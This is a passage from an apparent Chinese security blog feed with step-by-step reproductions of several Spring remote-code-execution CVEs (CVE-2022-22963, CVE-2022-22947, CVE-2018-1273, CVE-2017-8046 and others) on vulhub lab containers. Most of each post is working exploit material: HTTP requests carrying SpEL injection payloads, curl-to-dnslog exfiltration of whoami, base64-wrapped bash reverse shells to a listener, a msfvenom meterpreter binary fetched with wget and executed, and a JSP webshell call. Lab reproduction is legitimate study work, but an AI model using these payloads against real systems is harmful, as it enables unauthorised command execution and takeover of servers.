class="language-Linux">http://192.168.3.151:8080/tomcatwar.jsp?pwd=j&cmd=id</code></pre><p><img src="/2022/05/08/Spring-Framework/image-20220508142119920.png" alt="image-20220508142119920"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Function SpEL表达式命令注入(CVE-2022-22963)</title>
      <link href="/2022/05/07/Spring-Cloud-Function/"/>
      <url>/2022/05/07/Spring-Cloud-Function/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Function-SpEL表达式命令注入"><a href="#Spring-Cloud-Function-SpEL表达式命令注入" class="headerlink" title="Spring Cloud Function SpEL表达式命令注入"></a>Spring Cloud Function SpEL表达式命令注入</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Function 提供了一个通用的模型，用于在各种平台上部署基于函数的软件，包括像 Amazon AWS Lambda 这样的 FaaS（函数即服务，function as a service）平台。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>3.0.0.RELEASE &lt;&#x3D; Spring Cloud Function &lt;&#x3D; 3.2.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22963docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开网站<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507145015952.png" alt="image-20220507145015952"></p><p>先用<a href="http://dnslog.cn/">dnslog</a>获取一个dns</p><pre><code>mbehkf.dnslog.cn</code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160404330.png" alt="image-20220507160404330"></p><p>构造命令</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.kirjsf.dnslog.cn</code></pre><p>用<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160417478.png" alt="image-20220507160417478"></p><p>构造数据包</p><pre class=" language-bash"><code class="language-bash">POST /functionRouter HTTP/1.1Host:192.168.96.170:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closespring.cloud.function.routing-expression: T<span class="token punctuation">(</span>java.lang.Runtime<span class="token punctuation">)</span>.getRuntime<span class="token punctuation">(</span><span class="token punctuation">)</span>.exec<span class="token punctuation">(</span><span class="token string">"bash -c &amp;#123;echo,Y3VybCBgd2hvYW1pYC5raXJqc2YuZG5zbG9nLmNuCg==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;"</span><span class="token punctuation">)</span>Content-Type: text/plainContent-Length: 6<span class="token function">test</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160509318.png" alt="image-20220507160509318"></p><p>发送过去</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160528008.png" alt="image-20220507160528008"></p><p>过来了</p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>base64编码</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQo=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>用nc监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>然后把命令扔进去，发送数据包</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160905195.png" alt="image-20220507160905195"></p><p>过去了</p><p><img src="/2022/05/07/Spring-Cloud-Function/image-20220507160932257.png" alt="image-20220507160932257"></p><p>成功反弹shell！</p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行(CVE-2022-22947)</title>
      <link href="/2022/05/07/Spring-Cloud-Gateway/"/>
      <url>/2022/05/07/Spring-Cloud-Gateway/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行"><a href="#Spring-Cloud-Gateway-Actuator-API-SpEL表达式注入命令执行" class="headerlink" title="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行"></a>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Cloud Gateway 3.1.x - 3.1.1</p><p>Spring Cloud Gateway 3.0.x - 3.0.7</p><p>旧的、不受支持的版本也会受到影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2022-22947docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>打开<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507140704246.png" alt="image-20220507140704246"></p><p>构造恶意伪造数据包</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/jsonContent-Length: 329<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>  <span class="token string">"id"</span><span class="token keyword">:</span> <span class="token string">"hacktest"</span>,  <span class="token string">"filters"</span><span class="token keyword">:</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>    <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"AddResponseHeader"</span>,    <span class="token string">"args"</span><span class="token keyword">:</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>      <span class="token string">"name"</span><span class="token keyword">:</span> <span class="token string">"Result"</span>,      <span class="token string">"value"</span><span class="token keyword">:</span> <span class="token string">"#&amp;#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&amp;#123;\"id\"&amp;#125;).getInputStream()))&amp;#125;"</span>    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>  <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;],</span>  <span class="token string">"uri"</span><span class="token keyword">:</span> <span class="token string">"http://example.com"</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span></code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141227943.png" alt="image-20220507141227943"></p><p>用刚添加的路由发送如下数据包，此数据包会触发表达式执行</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141839633.png" alt="image-20220507141839633"></p><p>构造数据包查看结果</p><pre class=" language-bash"><code class="language-bash">GET /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 2</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507141932420.png" alt="image-20220507141932420"></p><p>结束后删除路由</p><pre class=" language-bash"><code class="language-bash">DELETE /actuator/gateway/routes/hacktest HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: close</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142054696.png" alt="image-20220507142054696"></p><p>最后在刷新</p><pre class=" language-bash"><code class="language-bash">POST /actuator/gateway/refresh HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 10.0<span class="token punctuation">;</span> Win64<span class="token punctuation">;</span> x64<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/97.0.4692.71 Safari/537.36Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 0</code></pre><p><img src="/2022/05/07/Spring-Cloud-Gateway/image-20220507142147356.png" alt="image-20220507142147356"></p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Data Commons远程命令执行漏洞(CVE-2018-1273)</title>
      <link href="/2022/05/07/Spring-Data-Commons/"/>
      <url>/2022/05/07/Spring-Data-Commons/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Data-Commons远程命令执行漏洞"><a href="#Spring-Data-Commons远程命令执行漏洞" class="headerlink" title="Spring Data Commons远程命令执行漏洞"></a>Spring Data Commons远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p></blockquote><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><blockquote><p>Spring Data Commons 1.13 - 1.13.10 (Ingalls SR10)</p><p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p><p>Spring Data Commons 2.0 to 2.0.5 (Kay SR5)</p><p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2018-1273docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h3><p>首先打开<code>http://192.168.3.151:8080/users</code></p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507103406340.png" alt="image-20220507103406340"></p><p>输入参数抓包</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507103644231.png" alt="image-20220507103644231"></p><p>先打开<a href="http://dnslog.cn/">dnslog</a>，随机搞一个dns</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507104638615.png" alt="image-20220507104638615"></p><p>构造语句</p><pre class=" language-bash"><code class="language-bash">curl <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span>.83axbz.dnslog.cn</code></pre><p>扔进<a href="https://x.hacking8.com/?post=293">base64编码</a></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC44M2F4YnouZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105039963.png" alt="image-20220507105039963"></p><p>把这个命令扔进数据包里</p><pre class=" language-base"><code class="language-base">username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("bash -c &#123;echo,Y3VybCBgd2hvYW1pYC44M2F4YnouZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;")]=&password=a&repeatedPassword=a</code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105159038.png" alt="image-20220507105159038"></p><p>看一下dnslog</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105211647.png" alt="image-20220507105211647"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>再base64编码一下</p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105449493.png" alt="image-20220507105449493"></p><p>设置监听</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把数据包发出去</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507105636857.png" alt="image-20220507105636857"></p><p>不知道为啥反弹不过来，换一种方法</p><p>先用<code>msfvenom</code>构造一个payload</p><pre class=" language-Linux"><code class="language-Linux">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.3.134 lport=4444 -f elf > /root/shell.elf</code></pre><p>打开<code>msfconsole</code></p><pre class=" language-Linux"><code class="language-Linux">use exploit/multi/handlerset payload linux/x86/meterpreter/reverse_tcpset lhost 192.168.3.134run</code></pre><p>开启http</p><pre class=" language-Linux"><code class="language-Linux">python -m SimpleHTTPServer</code></pre><p>然后构造上传命令</p><pre class=" language-Linux"><code class="language-Linux">wget http://192.168.3.134:8000/shell.elf</code></pre><p>扔进数据包里上传</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111530996.png" alt="image-20220507111530996"></p><p>上传成功</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111548952.png" alt="image-20220507111548952"></p><p>修改权限然后运行</p><pre class=" language-Linux"><code class="language-Linux">chmod 777 ./shell.elf./shell.elf</code></pre><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111735854.png" alt="image-20220507111735854"></p><p>成功回弹成功！</p><p><img src="/2022/05/07/Spring-Data-Commons/image-20220507111823424.png" alt="image-20220507111823424"></p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-Messaging远程命令执行漏洞(CVE-2018-1270)</title>
      <link href="/2022/05/07/Spring-Messaging/"/>
      <url>/2022/05/07/Spring-Messaging/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Messaging远程命令执行漏洞"><a href="#Spring-Messaging远程命令执行漏洞" class="headerlink" title="Spring-Messaging远程命令执行漏洞"></a>Spring-Messaging远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>spring messaging为spring框架提供消息支持，其上层协议是STOMP，底层通信基于SockJS，</p><p>在spring messaging中，其允许客户端订阅消息，并使用selector过滤消息。selector用SpEL表达式编写，并使用<code>StandardEvaluationContext</code>解析，造成命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>Spring Framework 5.0 - 5.0.4.<br>Spring Framework 4.3 - 4.3.14<br>已不支持的旧版本仍然受影响</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2018-1270docker-compose up -d</code></pre><h2 id="复现测试"><a href="#复现测试" class="headerlink" title="复现测试"></a>复现测试</h2><p>先访问<code>http://192.168.3.151:8080</code></p><p>使用官方的POC</p><p><code>https://github.com/vulhub/vulhub/blob/master/spring/CVE-2018-1270/exploit.py</code></p><p>修改一下</p><pre class=" language-python"><code class="language-python">sockjs <span class="token operator">=</span> SockJS<span class="token punctuation">(</span><span class="token string">'http://192.168.3.151:8080/gs-guide-websocket'</span><span class="token punctuation">)</span></code></pre><p><img src="/2022/05/07/Spring-Messaging/image-20220507092251940.png" alt="image-20220507092251940"></p><p>进入docker容器</p><pre class=" language-Linux"><code class="language-Linux">docker exec -it cve-2018-1270 bashcd /tmpls</code></pre><p><img src="/2022/05/07/Spring-Messaging/image-20220507092403941.png" alt="image-20220507092403941"></p><p>结束！！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Data Rest远程命令执行漏洞(CVE-2017-8046)</title>
      <link href="/2022/05/06/Spring-Data-Rest/"/>
      <url>/2022/05/06/Spring-Data-Rest/</url>
      
        <content type="html"><![CDATA[<h1 id="Spring-Data-Rest远程命令执行漏洞"><a href="#Spring-Data-Rest远程命令执行漏洞" class="headerlink" title="Spring Data Rest远程命令执行漏洞"></a>Spring Data Rest远程命令执行漏洞</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Spring Data REST是一个构建在Spring Data之上，为了帮助开发者更加容易地开发REST风格的Web服务。在REST API的Patch方法中，path的值被传入<code>setValue</code>，导致执行了SpEL表达式，触发远程命令执行漏洞。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>pivotal Spring Data REST &lt; 2.5.12 2.6.7 3.0 RC3<br>pivotal Spring Boot &lt; 2.0.0M4<br>pivotal Spring Data &lt; Kay-RC3</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd /vulhub/spring/CVE-2017-8046/docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.3.151:8080</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193255638.png" alt="image-20220506193255638"></p><p>可以看到这个东西</p><p>访问<code>http://192.168.3.151:8080/customers/1</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193353650.png" alt="image-20220506193353650"></p><p>打开<a href="http://dnslog.cn/">dnslog</a>，获取一个随机的dns</p><p><code>rmakrf.dnslog.cn</code></p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506193958215.png" alt="image-20220506193958215"></p><p>构造payload</p><pre><code>curl `whoami`.rmakrf.dnslog.cn</code></pre><p>然后打开<a href="https://x.hacking8.com/?post=293">base64</a>，转换一下</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506194628834.png" alt="image-20220506194628834"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,Y3VybCBgd2hvYW1pYC5ybWFrcmYuZG5zbG9nLmNu&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>把上面那一段转换成ascii码</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195048044.png" alt="image-20220506195048044"></p><p>用<code>PATCH</code>请求来修改</p><pre class=" language-base"><code class="language-base">PATCH /customers/1 HTTP/1.1Host: 192.168.3.151:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/json-patch+jsonContent-Length: 202[&#123; "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;98,97,115,104,32,45,99,32,123,101,99,104,111,44,89,51,86,121,98,67,66,103,100,50,104,118,89,87,49,112,89,67,53,121,98,87,70,114,99,109,89,117,90,71,53,122,98,71,57,110,76,109,78,117,125,124,123,98,97,115,101,54,52,44,45,100,125,124,123,98,97,115,104,44,45,105,125&#125;))/lastname", "value": "vulhub" &#125;]</code></pre><p>把这个包传过去看看</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195236520.png" alt="image-20220506195236520"></p><p>在dns中出来了</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195217529.png" alt="image-20220506195217529"></p><h3 id="构造反弹shell"><a href="#构造反弹shell" class="headerlink" title="构造反弹shell"></a>构造反弹shell</h3><pre class=" language-Linux"><code class="language-Linux">bash -i >& /dev/tcp/192.168.3.134/4444 0>&1</code></pre><p>先base64编码</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195524050.png" alt="image-20220506195524050"></p><pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -c <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTM0LzQ0NDQgMD4mMQ==&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;</span></code></pre><p>然后ascii码转换</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195615346.png" alt="image-20220506195615346"></p><p>设置监听端口</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p>把上面那东西替换，再次把包送过去</p><p><img src="/2022/05/06/Spring-Data-Rest/image-20220506195846351.png" alt="image-20220506195846351"></p><p>成了！</p><div><h1>推荐文章<span style="font-size:0.45em; color:gray">（由<a href="https://github.com/huiwang/hexo-recommended-posts">hexo文章推荐插件</a>驱动）</span></h1><ul><li><a href="http://broken-year.github.io/2022/11/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb/">攻防世界WEB篇</a></li><li><a href="http://broken-year.github.io/2022/06/10/mysql-Authentication-bypass/">Mysql 身份认证绕过漏洞(CVE-2012-2122)</a></li><li><a href="http://broken-year.github.io/2022/06/07/xss-cookie/">Xss获取cookie</a></li><li><a href="https://blogs.kainy.cn/2010/09/CallVerifID（phonefactor）电话登陆认证方法/">CallVerifID（phonefactor）电话登陆认证方法</a></li></ul></div>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
            <tag> 漏洞复现 </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> vulhub </tag>
            
            <tag> CVE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring-WebFlow远程代码执行漏洞(CVE-2017-4971)</title>
